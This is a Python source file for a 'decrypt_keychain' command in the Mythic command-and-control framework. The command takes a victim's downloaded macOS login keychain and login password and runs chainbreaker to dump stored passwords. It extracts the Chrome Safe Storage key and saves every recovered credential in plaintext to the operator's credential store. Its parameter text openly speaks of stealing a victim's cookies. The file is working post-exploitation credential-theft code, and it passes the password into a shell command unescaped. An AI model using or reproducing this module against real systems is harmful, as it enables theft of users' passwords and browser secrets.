from mythic_container.MythicCommandBase import *
import os
from mythic_container.MythicRPC import *
import sys
import base64
import asyncio


class DecryptKeychainArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                display_name="User Login Password",
                name="password",
                type=ParameterType.String,
                description="p@55w0rd_here for user login",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        ui_position=1
                    )
                ]
            ),
            CommandParameter(
                name="username",
                type=ParameterType.String,
                description="Victim's username from whom to steal the cookies",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        ui_position=2
                    )
                ]
            ),
            CommandParameter(
                name="file_id",
                type=ParameterType.String,
                description="File id of the user's already download login keychain",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        ui_position=3
                    )
                ]
            ),
        ]

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)


class DecryptKeychainCommand(CommandBase):
    cmd = "decrypt_keychain"
    needs_admin = False
    help_cmd = "decrypt_keychain -password \"user account password\" -username {username}"
    description = "Decrypts the keychain and stores credentials in Mythic's credential store."
    version = 1
    supported_ui_features = [""]
    author = "@antman"
    parameters = []
    attackmapping = ["T1539", "T1555"]
    argument_class = DecryptKeychainArguments
    script_only = True

    async def process_response(self, response: AgentResponse):
        pass

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        password = task.args.get_arg("password")
        getkeychainDBResp = await MythicRPC().execute("get_file",
                                                      task_id=task.id,
                                                      file_id=task.args.get_arg("file_id"),
                                                      limit_by_callback=True,
                                                      max_results=1,
                                                      get_contents=True)
        if getkeychainDBResp.status == MythicRPCStatus.Success and len(getkeychainDBResp.response) > 0:
            getkeychainDBResp = getkeychainDBResp.response[0]
        else:
            await MythicRPC().execute("create_output", task_id=task.id,
                output="Encountered an error attempting to get downloaded file: " + getkeychainDBResp.error)
            task.status = MythicStatus("Error: Failed to get keychain file")
            return task

        ## Write the downloaded login.keychain-db file to a new file on disk
        try:
            f = open("tmp_login.keychain-db", "wb")
            f.write(base64.b64decode(getkeychainDBResp["contents"]))
            f.close()
        except Exception as e:
            await MythicRPC().execute("create_output", task_id=task.id,
                                      output="Encountered an error attempting to write the keychainDB to a file: " + str(e))
            remove_temp_files()
            task.status = MythicStatus("Error: Failed to write file to disk")
            return task
        ## Decrypt Keychain and export keys to files
        try:
            proc = await asyncio.create_subprocess_shell(
                f"python2 /Mythic/mythic/chainbreaker/chainbreaker.py --password=\"{password}\" --dump-generic-passwords tmp_login.keychain-db",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()
            stdout = stdout.decode()
            stderr = stderr.decode()
            await MythicRPC().execute("create_output",
                                      task_id=task.id,
                                      output=f"Keychain Decrypted:\n{stdout}\n\nErrors from Decrypting:\n{stderr}")
            if len(stderr) > 0:
                task.status = MythicStatus("Error: Chainbreaker failed")
                return task
        except Exception as e:
            await MythicRPC().execute("create_output", task_id=task.id,
                                      output="Chainbreaker script failed with error: " + str(e))
            task.status = MythicStatus("Error: Chainbreaker failed")
            return task
        ## Remove the login.keychain-db file from disk
        remove_temp_files()

        ## parse the Chrome Safe Storage key from the coresponding keychain password dump file
        ccs_passwords = []
        ccs_item = {
            "account": "",
            "comment": "",
            "credential": "",
            "realm": ""
        }
        chrome_storage_password = ""
        for line in stdout.split("\n"):
            if "[+] Generic Password Record" in line:
                sys.stdout.flush()
                if ccs_item["credential"] != "":
                    ccs_passwords.append({
                        "account": ccs_item["account"],
                        "comment": ccs_item["comment"],
                        "credential": ccs_item["credential"],
                        "realm": ccs_item["realm"]
                    })
                    if ccs_item["realm"] == "Chrome Safe Storage":
                        chrome_storage_password = ccs_item["credential"]
                ccs_item = {
                    "account": "",
                    "comment": "",
                    "credential": "",
                    "realm": ""
                }
            elif "[-] Print Name:" in line:
                ccs_item["comment"] = ccs_item["comment"] + line.split(":")[-1].strip() + f" {task.args.get_arg('username')}"
            elif "[-] Account:" in line:
                ccs_item["account"] = line.split(":")[-1].strip()
            elif "[-] Service:" in line:
                ccs_item["realm"] = line.split(":")[-1].strip()
            elif "Password:" in line:
                ccs_item["credential"] = line.split(":")[-1].strip()
        if ccs_item["credential"] != "":
            ccs_passwords.append(ccs_item)
        await MythicRPC().execute("create_output", task_id=task.id,
                                  output="\n-----------------\n")
        for cred in ccs_passwords:
            create_cred_resp = await MythicRPC().execute("create_credential",
                                                         task_id=task.id,
                                                         credential_type="plaintext",
                                                         account=cred["account"],
                                                         realm=cred["realm"],
                                                         credential=cred["credential"],
                                                         comment=cred["comment"])
            if create_cred_resp.status == MythicRPCStatus.Success:
                await MythicRPC().execute("create_output",
                                          task_id=task.id,
                                          output=f"[*] Added credential for {cred['realm']}\n")
        task.status = MythicStatus.Completed
        return task


def remove_temp_files():
    try:
        if os.path.isfile('/Mythic/mythic/tmp_Cookies'):
            os.remove('/Mythic/mythic/tmp_Cookies')
    except Exception as e:
        raise Exception("Failed to remove apfell/mythic/tmp_Cookies file")
    try:
        if os.path.isfile('/Mythic/mythic/cookies.json'):
            os.remove('/Mythic/mythic/cookies.json')
    except Exception as e:
        raise Exception("Failed to remove apfell/mythic/cookies.json file")
    try:
        if os.path.isfile('/Mythic/mythic/tmp_login.keychain-db'):
            os.remove('/Mythic/mythic/tmp_login.keychain-db')
    except Exception as e:
        raise Exception("Failed to remove apfell/mythic/tmp_login.keychain-db")
